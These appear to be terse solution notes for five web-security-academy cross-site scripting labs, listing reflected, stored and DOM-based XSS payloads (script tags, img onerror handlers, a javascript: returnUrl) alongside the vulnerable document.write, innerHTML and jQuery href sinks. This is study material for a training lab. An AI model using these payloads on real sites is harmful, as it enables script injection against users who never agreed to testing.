# 1 Reflected XSS into HTML context with nothing encoded

https://ac191f6f1fb8d6b4c0b4b4a4009000d1.web-security-academy.net/?search=<script>alert(1234)</script>

# 2 Stored XSS into HTML context with nothing encoded

<script>alert(1)</script>

# 3 DOM XSS in document.write sink using source location.search

document.write('... <script>alert(document.domain)</script> ...');

https://ac6b1f671f105755c027459b007f00ca.web-security-academy.net/?search=test"><img src=x onerror=alert(1234)>

# 4 DOM XSS in innerHTML sink using source location.search

https://acda1f821fd6dccbc0400cf5008c0070.web-security-academy.net/?search=test'><img src=x onerror=alert(1234)>

# 5 DOM XSS in jQuery anchor href attribute sink using location.search source
	
	$(function() { $('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl')); });
	
	?returnUrl=javascript:alert(document.domain)
	



